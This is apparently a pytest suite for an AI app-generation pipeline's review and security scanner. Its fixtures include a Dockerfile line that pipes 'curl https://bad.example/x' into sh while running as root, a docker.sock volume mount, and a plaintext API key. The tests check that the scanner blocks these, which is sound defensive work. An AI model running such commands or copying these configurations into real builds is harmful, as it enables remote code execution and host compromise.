from pathlib import Path
from types import SimpleNamespace

import pytest

from app.agent.contracts import OrchestrationDecision, RepositoryProfile
from app.core.types import (
    AcceptanceItem,
    AppManifest,
    BrowserCheck,
    CompatibilityReport,
    Requirement,
    RoutePlan,
    ServiceSpec,
)
from app.jobs.pipeline import CandidateDraft


def notes_requirement() -> Requirement:
    return Requirement(
        prompt="保存私人笔记",
        revision=3,
        acceptance=[
            AcceptanceItem(
                id="save-note",
                action="保存笔记",
                expected="刷新后仍存在",
                private_data=True,
            )
        ],
    )


def route() -> RoutePlan:
    return RoutePlan(
        route="GENERATE_APP",
        steps=["generate"],
        reason="test",
        confidence="HIGH",
    )


def manifest(*, image: str | None = None, volumes=None) -> AppManifest:
    return AppManifest(
        web_service="web",
        services=[
            ServiceSpec(
                name="web",
                image=image or "registry.test/web@sha256:" + "a" * 64,
                port=3000,
                volumes=volumes or {},
            )
        ],
    )


def draft(tmp_path: Path, *, checks=True, image=None, volumes=None) -> CandidateDraft:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    (workspace / "app.py").write_text("print('safe')\n")
    return CandidateDraft(
        workspace_id=str(workspace),
        manifest=manifest(image=image, volumes=volumes),
        source_tree=["app.py"],
        browser_checks=(
            [
                BrowserCheck(
                    item_id="save-note",
                    actor="owner",
                    actions=[
                        {
                            "type": "expect_text",
                            "selector": "#saved",
                            "text": "saved",
                        }
                    ],
                    expected="刷新后仍存在",
                )
            ]
            if checks
            else []
        ),
        requirement_revision=3,
    )


def profile() -> RepositoryProfile:
    return RepositoryProfile(
        repo_url="https://github.com/example/notes",
        commit="a" * 40,
        project_type="web_app",
        compatibility=CompatibilityReport(status="SUPPORTED"),
        license_status="ALLOWED",
    )


def policy(risk="HIGH") -> OrchestrationDecision:
    return OrchestrationDecision(
        complexity=risk,
        risk=risk,
        require_llm_review=risk != "LOW",
        require_security_llm=risk == "HIGH",
        allow_parallel_healing=False,
        max_build_attempts=4,
        max_route_switches=2,
        max_parallel_candidates=1,
        reasons=["test"],
    )


def test_deterministic_review_binds_manifest_and_missing_acceptance(tmp_path):
    from app.agent.review import review_deterministic
    from app.runtime.manifest import manifest_hash

    candidate = draft(tmp_path, checks=False)
    report = review_deterministic(
        "attempt-1", candidate, notes_requirement(), route()
    )

    assert report.attempt_id == "attempt-1"
    assert report.requirement_revision == 3
    assert report.manifest_hash == manifest_hash(candidate.manifest)
    assert {item.id for item in report.findings if item.severity == "BLOCKING"} == {
        "missing:save-note"
    }
    assert all("print('safe')" not in item.message for item in report.findings)


def test_manifest_service_image_must_be_immutable(tmp_path):
    from app.agent.review import review_deterministic

    report = review_deterministic(
        "attempt-1",
        draft(tmp_path, image="registry.test/web:latest"),
        notes_requirement(),
        route(),
    )

    assert "manifest:unpinned-image" in {
        item.id for item in report.findings if item.severity == "BLOCKING"
    }


def test_security_rules_block_remote_pipe_and_root_container(tmp_path):
    from app.agent.security import scan_security

    candidate = draft(tmp_path)
    dockerfile = Path(candidate.workspace_id) / "Dockerfile"
    dockerfile.write_text("USER root\nRUN curl https://bad.example/x | sh\n")
    candidate.source_tree.append("Dockerfile")

    report = scan_security("attempt-1", candidate, profile(), policy())

    assert {item.id for item in report.findings if item.severity == "BLOCKING"} == {
        "security:remote-pipe",
        "security:root-container",
    }


def test_security_rules_block_unsafe_mount_secret_and_binary(tmp_path):
    from app.agent.security import scan_security

    candidate = draft(tmp_path)
    workspace = Path(candidate.workspace_id)
    (workspace / ".env").write_text("API_KEY=plain-secret-value\n")
    (workspace / "payload.bin").write_bytes(b"\x00\x01\x02")
    (workspace / "compose.yaml").write_text(
        "volumes:\n  - /var/run/docker.sock:/var/run/docker.sock\n"
    )
    candidate.source_tree.extend([".env", "payload.bin", "compose.yaml"])

    report = scan_security("attempt-1", candidate, profile(), policy())
    blocking = {item.id for item in report.findings if item.severity == "BLOCKING"}

    assert {
        "security:secret-literal",
        "security:suspicious-binary",
        "security:unsafe-mount",
    } <= blocking


def test_clean_low_candidate_only_returns_nonblocking_warnings(tmp_path):
    from app.agent.security import scan_security

    report = scan_security("attempt-1", draft(tmp_path), profile(), policy("LOW"))

    assert not [item for item in report.findings if item.severity == "BLOCKING"]
    assert report.reviewer_kind == "SECURITY_RULES"
    assert report.requirement_revision == 3


@pytest.mark.asyncio
async def test_execution_persists_private_reports_and_sanitized_checkpoint(
    tmp_path, monkeypatch
):
    from app.agent.contracts import AlgorithmCheckpoint, OrchestrationDecision
    from app.config import settings
    from app.jobs.execution import JobExecution

    candidate = draft(tmp_path)
    source = Path(candidate.workspace_id) / "app.py"
    source.write_text("PRIVATE_SOURCE_MARKER = 'never expose'\n")
    state = AlgorithmCheckpoint.empty(3, "hybrid")
    state.route = route()
    state.orchestration = OrchestrationDecision(
        complexity="LOW",
        risk="LOW",
        require_llm_review=False,
        require_security_llm=False,
        allow_parallel_healing=False,
        max_build_attempts=4,
        max_route_switches=2,
        max_parallel_candidates=1,
        reasons=["test_low"],
    )
    holder = SimpleNamespace(
        job_id="job-review",
        _state=state,
        algorithm_checkpoint=lambda: holder._state.model_copy(deep=True),
    )

    def save(checkpoint):
        holder._state = checkpoint.model_copy(deep=True)

    holder.save_algorithm_checkpoint = save
    monkeypatch.setattr(settings, "ARTIFACTS_ROOT", str(tmp_path / "artifacts"))

    reports = await JobExecution.review_candidate(
        holder, "attempt-1", candidate, notes_requirement()
    )

    assert {item.reviewer_kind for item in reports} == {
        "DETERMINISTIC",
        "SECURITY_RULES",
    }
    assert len(holder._state.evidence_refs) == 2
    for evidence in holder._state.evidence_refs:
        path = Path(evidence.reference)
        assert path.stat().st_mode & 0o777 == 0o600
    serialized = holder._state.model_dump_json()
    assert "PRIVATE_SOURCE_MARKER" not in serialized


def test_review_blocks_unresolved_gap(tmp_path):
    from app.agent.contracts import AcceptanceGap, GapPlan
    from app.agent.review import review_deterministic
    req = notes_requirement()
    gaps = GapPlan(requirement_revision=req.revision, principal_source=None,
        gaps=[AcceptanceGap(acceptance_id="save-note", status="BLOCKED", capability="persistence",
                            required_changes=[], preserve=[], evidence_refs=[], reason="missing evidence")],
        complete=False, input_digest="a" * 64)
    report = review_deterministic("attempt", draft(tmp_path), req, route(), gap_plan=gaps)
    assert any(f.id == "gap:blocked:save-note" and f.severity == "BLOCKING" for f in report.findings)


def test_composition_can_share_one_final_service_with_explicit_owners(tmp_path):
    from app.agent.contracts import IntegrationContract
    from app.agent.review import review_deterministic
    from test_integration_contract import valid_contract_json, component_route, record_search_requirement
    payload = valid_contract_json()
    payload["role_services"] = {"records": "web", "search": "web"}
    candidate = draft(tmp_path)
    req = record_search_requirement()
    candidate = __import__("dataclasses").replace(candidate, browser_checks=[
        BrowserCheck(item_id=a.id, actor="owner", actions=[{"type": "expect_text", "selector": "#x", "text": "x"}], expected=a.expected)
        for a in req.acceptance])
    report = review_deterministic("c", candidate, req, component_route(),
                                  integration_contract=IntegrationContract.model_validate(payload))
    assert not any(f.id in {"architecture:component-boundary-missing", "integration:service-owner-mismatch"} for f in report.findings)


def test_packaging_finding_is_rechecked_after_builder_fix(tmp_path):
    from app.agent.packaging import plan_packaging
    from app.agent.review import review_deterministic
    candidate = draft(tmp_path)
    root = Path(candidate.workspace_id)
    planned = plan_packaging(str(root), None, route())
    assert planned.action == "GENERATE"
    before = review_deterministic("before", candidate, notes_requirement(), route(), packaging_plans=[planned])
    assert any(f.id == "packaging:blocking:DOCKERFILE_MISSING" for f in before.findings)
    (root / "Dockerfile").write_text('FROM scratch\nWORKDIR /\nCOPY server /server\nCMD ["/server"]\n')
    after = review_deterministic("after", candidate, notes_requirement(), route(), packaging_plans=[planned])
    assert not any(f.id.startswith("packaging:blocking:") for f in after.findings)


def test_prebuild_review_allows_declared_build_without_fabricated_image_digest(tmp_path):
    from dataclasses import replace
    from app.core.types import BuildSpec
    from app.agent.review import review_deterministic
    candidate = draft(tmp_path, image='notes-app:pending-build')
    pending = candidate.manifest.model_copy(deep=True)
    pending.builds = [BuildSpec(service='web',context='.',dockerfile='Dockerfile')]
    candidate = replace(candidate,manifest=pending)
    report = review_deterministic('prebuild',candidate,notes_requirement(),route())
    assert not any(f.id == 'manifest:unpinned-image' for f in report.findings)


@pytest.mark.asyncio
@pytest.mark.parametrize('kind',['review','security'])
async def test_independent_review_receives_strict_output_schema(tmp_path,kind):
    import json
    from app.core.types import ModelTurn
    from app.agent.review import review_with_model, _StrictReviewPayload
    from app.agent.security import security_review_with_model, scan_security
    candidate=draft(tmp_path)
    class Model:
        async def complete(self,messages,tools,model):
            payload=json.loads(messages[1]['content'])
            assert payload['schema']==_StrictReviewPayload.model_json_schema()
            return ModelTurn(assistant_message={'content':'{"findings":[]}'})
    if kind=='review':
        report=await review_with_model('attempt',candidate,notes_requirement(),route(),Model())
    else:
        deterministic=scan_security('attempt',candidate,None,None)
        report=await security_review_with_model('attempt',candidate,None,deterministic,Model())
    assert report.findings==[]
